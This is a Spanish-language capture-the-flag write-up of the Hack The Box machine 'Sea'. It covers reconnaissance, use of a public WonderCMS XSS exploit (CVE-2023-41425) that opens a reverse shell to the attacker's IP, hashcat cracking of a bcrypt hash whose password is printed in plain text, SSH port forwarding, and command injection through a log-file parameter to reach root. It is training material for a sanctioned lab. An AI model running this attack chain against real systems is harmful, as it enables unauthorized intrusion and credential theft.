---
title: Sea
description: Sea es una máquina Linux de nivel de dificultad fácil que presenta en WonderCMS una vulnerabilidad de cross-site scripting (XSS) que se puede utilizar para cargar un módulo malicioso, lo que permite el acceso al sistema. La escalada de privilegios consiste en extraer y descifrar una contraseña del archivo de base de datos de WonderCMS, para luego explotar una inyección de comandos en un software de monitoreo de sistema personalizado, lo que nos da acceso a root.
date: 2024-08-19
toc: true
pin: false
image:
 path: /assets/img/htb-writeup-sea/sea_logo.png
categories:
  - Hack The Box
  - Machines
tags:
  - linux
  - hack the box
  - fuzzing web
  - xss
  - cve
  - port forwarding
  - os command injection
  - password attacks
  - ssh
  - http
  - tcp
  - information gathering
  - web analysis
  - user pivoting
  - lateral movement
  - privilege escalation

---
## Information Gathering

El análisis inicial comienza con el comando ping para confirmar la accesibilidad de la máquina objetivo en la red.

```terminal
/home/kali/Documents/htb/machines/sea:-$ ping -c 1 10.10.11.28
PING 10.10.11.28 (10.10.11.28) 56(84) bytes of data.
64 bytes from 10.10.11.28: icmp_seq=1 ttl=63 time=392 ms

--- 10.10.11.28 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 392.040/392.040/392.040/0.000 ms
```

Realizo un escaneo agresivo de puertos con nmap, lo que me permite identificar rápidamente todos los puertos abiertos.

```terminal
/home/kali/Documents/htb/machines/sea:-$ sudo nmap -p- -sS --min-rate 5000 -vvv -n -Pn 10.10.11.28 -oG map1
Host: 10.10.11.28 ()	Status: Up
Host: 10.10.11.28 ()	Ports: 22/open/tcp//ssh///, 80/open/tcp//http///
```

Profundizo en los puertos detectados, recopilando información detallada sobre los servicios y versiones en ejecución.

```terminal
/home/kali/Documents/htb/machines/sea:-$ sudo nmap -sCV -p22,80 -vvv 10.10.11.28 -oN map2
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e3:54:e0:72:20:3c:01:42:93:d1:66:9d:90:0c:ab:e8 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCZDkHH698ON6uxM3eFCVttoRXc1PMUSj8hDaiwlDlii0p8K8+6UOqhJno4Iti+VlIcHEc2THRsyhFdWAygICYaNoPsJ0nhkZsLkFyu/lmW7frIwINgdNXJOLnVSMWEdBWvVU7owy+9jpdm4AHAj6mu8vcPiuJ39YwBInzuCEhbNPncrgvXB1J4dEsQQAO4+KVH+QZ5ZCVm1pjXTjsFcStBtakBMykgReUX9GQJ9Y2D2XcqVyLPxrT98rYy+n5fV5OE7+J9aiUHccdZVngsGC1CXbbCT2jBRByxEMn+Hl+GI/r6Wi0IEbSY4mdesq8IHBmzw1T24A74SLrPYS9UDGSxEdB5rU6P3t91rOR3CvWQ1pdCZwkwC4S+kT35v32L8TH08Sw4Iiq806D6L2sUNORrhKBa5jQ7kGsjygTf0uahQ+g9GNTFkjLspjtTlZbJZCWsz2v0hG+fzDfKEpfC55/FhD5EDbwGKRfuL/YnZUPzywsheq1H7F0xTRTdr4w0At8=
|   256 f3:24:4b:08:aa:51:9d:56:15:3d:67:56:74:7c:20:38 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMMoxImb/cXq07mVspMdCWkVQUTq96f6rKz6j5qFBfFnBkdjc07QzVuwhYZ61PX1Dm/PsAKW0VJfw/mctYsMwjM=
|   256 30:b1:05:c6:41:50:ff:22:a3:7f:41:06:0e:67:fd:50 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHuXW9Vi0myIh6MhZ28W8FeJo0FRKNduQvcSzUAkWw7z
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Sea - Home
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
```terminal
/home/kali/Documents/htb/machines/sea:-$ whatweb 10.10.11.28
http://10.10.11.28 [200 OK] Apache[2.4.41], Bootstrap[3.3.7], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.28], JQuery[1.12.4], Script, Title[Sea - Home], X-UA-Compatible[IE=edge]
```

---
## Web Analysis

Durante el reconocimiento inicial, me encuentro con una web que contiene poca información visible.

![](/assets/img/htb-writeup-sea/sea1_1.png)

Al explorar la pestaña "How to participate", noto que al hacer hovering sobre el enlace de "contact" aparece una dirección que debería agregar en el archivo '/etc/hosts' para acceder correctamente.

![](/assets/img/htb-writeup-sea/sea1_2.png)

```terminal
/home/kali/Documents/htb/machines/sea:-$ echo '10.10.11.28\tsea.htb' | sudo tee -a /etc/hosts
```

En la nueva dirección descubierta, 'sea.htb/contact.php', encuentro un formulario de contacto.

![](/assets/img/htb-writeup-sea/sea1_3.png)

Para encontrar más información sobre la aplicación web, realizo una busqueda con Dirsearch.

```terminal
/home/kali/Documents/htb/machines/sea:-$ dirsearch -u http://sea.htb/ -r -x 400,403,404,500
Target: http://sea.htb/

Starting:
200 -    1KB - /404
200 -  939B  - /contact.php
301 -  232B  - /data  ->  http://10.10.11.28/data/
Added to the queue: data/
301 -  236B  - /messages  ->  http://10.10.11.28/messages/
Added to the queue: messages/
301 -  235B  - /plugins  ->  http://10.10.11.28/plugins/
Added to the queue: plugins/
301 -  234B  - /themes  ->  http://10.10.11.28/themes/
Added to the queue: themes/

Starting: data/
200 -    1KB - /data/404
200 -    1KB - /data/admin/home
301 -  238B  - /data/files  ->  http://10.10.11.28/data/files/
Added to the queue: data/files/
200 -    1KB - /data/home
200 -    1KB - /data/sitecore/content/home
200 -    1KB - /data/sym/root/home/
Added to the queue: data/sym/root/home/

Starting: messages/
200 -    1KB - /messages/404
200 -    1KB - /messages/admin/home
200 -    1KB - /messages/home
200 -    1KB - /messages/sitecore/content/home
200 -    1KB - /messages/sym/root/home/
Added to the queue: messages/sym/root/home/

Starting: plugins/
200 -    1KB - /plugins/404
200 -    1KB - /plugins/admin/home
200 -    1KB - /plugins/home
200 -    1KB - /plugins/sitecore/content/home
200 -    1KB - /plugins/sym/root/home/
Added to the queue: plugins/sym/root/home/

Starting: themes/
200 -    1KB - /themes/404
200 -    1KB - /themes/admin/home
200 -    1KB - /themes/home
200 -    1KB - /themes/sitecore/content/home
200 -    1KB - /themes/sym/root/home/
Added to the queue: themes/sym/root/home/

Starting: data/files/
200 -    1KB - /data/files/404
200 -    1KB - /data/files/admin/home
200 -    1KB - /data/files/home
200 -    1KB - /data/files/sitecore/content/home
200 -    1KB - /data/files/sym/root/home/
Added to the queue: data/files/sym/root/home/

Starting: data/sym/root/home/
Starting: messages/sym/root/home/
Starting: plugins/sym/root/home/
Starting: themes/sym/root/home/
Starting: data/files/sym/root/home/

Task Completed
```

Encuentro cuatro subdirectorios, pero ninguno contiene información sensible. Decido realizar un segundo análisis más detallado, centrado únicamente en estos subdirectorios.

```terminal
/home/kali/Documents/htb/machines/sea:-$ dirsearch -u http://sea.htb/ -r --subdirs themes,data,plugins,messages -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -x 400,403,404,500
Target: http://sea.htb/

Starting: themes/
200 -    1KB - /themes/home
200 -    1KB - /themes/404
301 -  239B  - /themes/bike  ->  http://10.10.11.28/themes/bike/
Added to the queue: themes/bike/

Starting: data/
200 -    1KB - /data/home
301 -  238B  - /data/files  ->  http://10.10.11.28/data/files/
Added to the queue: data/files/
200 -    1KB - /data/404

Starting: plugins/
200 -    1KB - /plugins/home
200 -    1KB - /plugins/404

Starting: messages/
200 -    1KB - /messages/home
200 -    1KB - /messages/404

Starting: themes/bike/
200 -    1KB - /themes/bike/home
301 -  243B  - /themes/bike/img  ->  http://10.10.11.28/themes/bike/img/
Added to the queue: themes/bike/img/
200 -    6B  - /themes/bike/version
301 -  243B  - /themes/bike/css  ->  http://10.10.11.28/themes/bike/css/
Added to the queue: themes/bike/css/
200 -   66B  - /themes/bike/summary
200 -    1KB - /themes/bike/404
200 -    1KB - /themes/bike/LICENSE
Starting: data/files/
200 -    1KB - /data/files/home
200 -    1KB - /data/files/404
```

El segundo análisis revela recursos adicionales en el subdirectorio '/themes/bike/' encuentro varios archivos que sugieren que este es un proyecto basado en un CMS. Explorando manualmente, localizo un archivo 'README.md' que confirma que el CMS utilizado es WonderCMS. Además, el archivo 'version' indica la versión específica que está siendo usada.

![](/assets/img/htb-writeup-sea/sea1_4.png)
![](/assets/img/htb-writeup-sea/sea1_5.png)

---
## User Pivoting

La versión de WonderCMS v3.2.0 presenta una vulnerabilidad de Cross Site Scripting, [CVE-2023-41425](https://nvd.nist.gov/vuln/detail/CVE-2023-41425).

<https://github.com/insomnia-jacob/CVE-2023-41425>

Ejecuto el script proporcionado, especificando la URL del sitio vulnerable, mi dirección IP y el puerto en el que estaré escuchando.

```terminal
/home/kali/Documents/htb/machines/sea:-$ git clone https://github.com/insomnia-jacob/CVE-2023-41425.git

/home/kali/Documents/htb/machines/sea/CVE-2023-41425:-$ ./exploit.py -u http://sea.htb/loginURL -i 10.10.16.84 -p 4321
```
![](/assets/img/htb-writeup-sea/sea1_6.png)

El script genera un payload malicioso que debo introducir en el campo 'website' del formulario de contacto previamente identificado.

Antes de enviar el payload, configuro un listener con Netcat para capturar cualquier conexión entrante.

```terminal
/home/kali/Documents/htb/machines/sea/CVE-2023-41425-$ nc -nvlp 4321
	listening on [any] 4321 ...
```

![](/assets/img/htb-writeup-sea/sea1_7.png)
![](/assets/img/htb-writeup-sea/sea1_8.png)

```
	...conect to [10.10.11.84] from (UNKNOWN) [10.10.11.28] 47366
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---
## Lateral Movement

Ajusto el terminal para mejorar la interacción con el sistema.

```terminal
$ script /dev/null -c bash
Script started, file is /dev/null
www-data@sea:/$ ^Z
zsh: suspended  nc -nvlp 4321
                                                      
/home/kali/Documents/htb/machines/sea/CVE-2023-41425-$ stty raw -echo;fg
[1]  + continued  nc -nvlp 4321
                               reset
reset: unknown terminal type unknown
Terminal type? xterm

www-data@sea:/$ export TERM=xterm
www-data@sea:/$ export SHELL=bash
/home/kali/Documents/htb/machines/sea/CVE-2023-41425-$ stty size
42 176
www-data@sea:/$ stty rows 42 columns 176
```

Reviso los usuarios disponibles en el sistema con shell habilitada.

```terminal
www-data@sea:/$ cat /etc/passwd | grep /bash$
root:x:0:0:root:/root:/bin/bash
amay:x:1000:1000:amay:/home/amay:/bin/bash
geo:x:1001:1001::/home/geo:/bin/bash
```

Explorando los archivos de la aplicación, encuentro un archivo que contiene una contraseña hasheada.

```terminal
www-data@sea:/var/www/sea/data$ cat database.js
```

![](/assets/img/htb-writeup-sea/sea2_2.png)

Es necesario eliminar las barras invertidas ```\``` del hash, ya que estas actúan como caracteres de escape y pueden causar errores en Hashcat. El hash sigue el formato estándar de bcrypt:```$2y$[cost]$[salt][hashed_password]```.

```terminal
/home/kali/Documents/htb/machines/sea:-$ echo '$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q' > hash.txt

/home/kali/Documents/htb/machines/sea:-$ hashcat --show hash.txt
3200 | bcrypt $2*$, Blowfish (Unix)  | Operating System

/home/kali/Documents/htb/machines/sea:-$ hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
password : mychemicalromance
```

Con la contraseña descubierta, me conecto al sistema como el usuario 'amay'.

```terminal
/home/kali/Documents/htb/machines/sea:-$ ssh amay@sea.htb
amay@sea.htb's password: mychemicalromance

amay@sea:~$ cat user.txt
```

---
## Privilege Escalation

Al enumerar los servicios en ejecución, encuentro que el puerto 8080 está escuchando conexiones desde localhost.

```terminal
amay@sea:~$ ss -tulnp
```

![](/assets/img/htb-writeup-sea/sea3_1.png)

Para acceder al servicio, realizo un port forwarding por SSH desde mi máquina.

```terminal
$ ssh -L 8080:127.0.0.1:8080 amay@sea.htb -N -f
amay@sea.htb's password: mychemicalromance
```

Una vez configurado el túnel, accedo al servicio en mi navegador en http://127.0.0.1:8080 utilizando las credenciales del usuario 'amay'.

![](/assets/img/htb-writeup-sea/sea3_2.png)

![](/assets/img/htb-writeup-sea/sea3_3.png)

El servicio resultó ser un sistema de monitoreo con diversas funcionalidades. Una de ellas, "Analyze Log File", permite analizar archivos de registro, específicamente el archivo 'access.log' de Apache.

Para interactuar con esta funcionalidad, selecciono el archivo y envío la solicitud POST correspondiente, interceptándola con Burp Suite para modificarla.

![](/assets/img/htb-writeup-sea/sea3_4.png)

Mediante Burp Suite, modifico el parámetro 'log_file' en la solicitud interceptada. El parámetro original apunta al archivo '/var/log/apache2/access.log'. Modifico este campo e inserto una inyección de comandos para leer la flag de 'root'.

![](/assets/img/htb-writeup-sea/sea3_5.png)

> <a href="https://www.hackthebox.com/achievement/machine/1521382/620" target="_blank">Sea Machine from Hack The Box has been Pwned</a>
{: .prompt-tip }